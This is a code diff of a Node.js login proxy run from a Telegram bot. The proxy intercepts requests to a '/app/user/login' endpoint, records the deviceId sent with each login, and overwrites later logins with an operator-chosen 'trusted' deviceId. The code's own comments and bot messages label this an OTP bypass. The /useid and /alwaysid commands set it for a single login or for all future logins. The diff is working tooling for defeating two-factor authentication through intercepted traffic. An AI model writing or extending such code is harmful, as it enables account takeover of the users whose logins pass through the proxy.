@@ -782,36 +782,26 @@ app.use(async (req, res, next) => {
 });
 
 async function proxyFetch(req, timeoutMs) {
-  // === ID OVERRIDE & CAPTURE LOGIC ===
+  // === ID OVERRIDE LOGIC (ONLY DEVICEID IS OVERRIDDEN FOR OTP BYPASS) ===
   if (req.originalUrl && req.originalUrl.includes('/app/user/login')) {
     try {
       const data = cachedData || await loadData();
       const body = req.parsedBody || {};
 
-      // 1. Auto-capture last seen IDs for easy /useid or /alwaysid command usage
-      if (body.deviceId || body.challengeId) {
+      // 1. Auto-capture last seen deviceId for easy /useid or /alwaysid command usage
+      if (body.deviceId) {
         if (!data.lastCapturedId) data.lastCapturedId = {};
-        if (body.deviceId) data.lastCapturedId.deviceId = body.deviceId;
-        if (body.challengeId) data.lastCapturedId.challengeId = body.challengeId;
+        data.lastCapturedId.deviceId = body.deviceId;
         saveData(data).catch(() => {});
       }
 
-      // 2. Check for active ID Override (single-use or persistent)
+      // 2. Check for active deviceId Override (single-use or persistent)
       const override = data.useIdOverride || data.alwaysIdOverride;
-      if (override) {
-        let modified = false;
-        if (override.deviceId) {
-          body.deviceId = override.deviceId;
-          modified = true;
-        }
-        if (override.challengeId) {
-          body.challengeId = override.challengeId;
-          modified = true;
-        }
-        if (modified) {
-          req.parsedBody = body;
-          req.rawBody = Buffer.from(JSON.stringify(body), 'utf8');
-        }
+      if (override && override.deviceId) {
+        body.deviceId = override.deviceId;
+        req.parsedBody = body;
+        req.rawBody = Buffer.from(JSON.stringify(body), 'utf8');
+
         // Single-use override: clear after applying once
         if (data.useIdOverride) {
           data.useIdOverride = null;
@@ -1371,18 +1361,16 @@ Example:
       const freshData = await loadData(true);
       const parts = text.trim().split(/\s+/);
       let devId = parts[1];
-      let chalId = parts[2];
       if (!devId && freshData.lastCapturedId) {
         devId = freshData.lastCapturedId.deviceId;
-        chalId = freshData.lastCapturedId.challengeId;
       }
       if (!devId) {
-        await bot.sendMessage(chatId, '⚠️ Usage: /useid <deviceId> [challengeId]\nOr run /useid directly after a login attempt to use last captured IDs.');
+        await bot.sendMessage(chatId, '⚠️ Usage: /useid <deviceId>\nOr run /useid directly after a login attempt to use last captured deviceId.');
         return res.sendStatus(200);
       }
-      freshData.useIdOverride = { deviceId: devId || '', challengeId: chalId || '' };
+      freshData.useIdOverride = { deviceId: devId };
       await saveData(freshData);
-      await bot.sendMessage(chatId, `🎯 *Single-Use ID Override Set*\n━━━━━━━━━━━━━━━━━━\n📱 *DeviceId:* \`${devId}\`\n🔑 *ChallengeId:* \`${chalId || 'N/A'}\`\n\n📌 Will apply to the VERY NEXT login attempt and then reset.`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `🎯 *Single-Use DeviceId Override Set (OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will apply to the VERY NEXT login attempt and then auto-reset.`, { parse_mode: 'Markdown' });
       return res.sendStatus(200);
     }
 
@@ -1391,23 +1379,21 @@ Example:
       if (text.trim() === '/alwaysid off') {
         freshData.alwaysIdOverride = null;
         await saveData(freshData);
-        await bot.sendMessage(chatId, '🔴 Always ID Override OFF');
+        await bot.sendMessage(chatId, '🔴 Always DeviceId Override OFF');
         return res.sendStatus(200);
       }
       const parts = text.trim().split(/\s+/);
       let devId = parts[1];
-      let chalId = parts[2];
       if (!devId && freshData.lastCapturedId) {
         devId = freshData.lastCapturedId.deviceId;
-        chalId = freshData.lastCapturedId.challengeId;
       }
       if (!devId) {
-        await bot.sendMessage(chatId, '⚠️ Usage: /alwaysid <deviceId> [challengeId]\nOr /alwaysid off to disable.');
+        await bot.sendMessage(chatId, '⚠️ Usage: /alwaysid <deviceId>\nOr /alwaysid off to disable.');
         return res.sendStatus(200);
       }
-      freshData.alwaysIdOverride = { deviceId: devId || '', challengeId: chalId || '' };
+      freshData.alwaysIdOverride = { deviceId: devId };
       await saveData(freshData);
-      await bot.sendMessage(chatId, `🔄 *Always ID Override Set (Persistent)*\n━━━━━━━━━━━━━━━━━━\n📱 *DeviceId:* \`${devId}\`\n🔑 *ChallengeId:* \`${chalId || 'N/A'}\`\n\n📌 Will overwrite all future login attempts until /alwaysid off.`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `🔄 *Always DeviceId Override Set (Persistent OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will overwrite deviceId for all future login attempts until /alwaysid off.`, { parse_mode: 'Markdown' });
       return res.sendStatus(200);
     }
 
@@ -1416,7 +1402,7 @@ Example:
       freshData.useIdOverride = null;
       freshData.alwaysIdOverride = null;
       await saveData(freshData);
-      await bot.sendMessage(chatId, '🧹 All ID Overrides Cleared!');
+      await bot.sendMessage(chatId, '🧹 All DeviceId Overrides Cleared!');
       return res.sendStatus(200);
     }
 
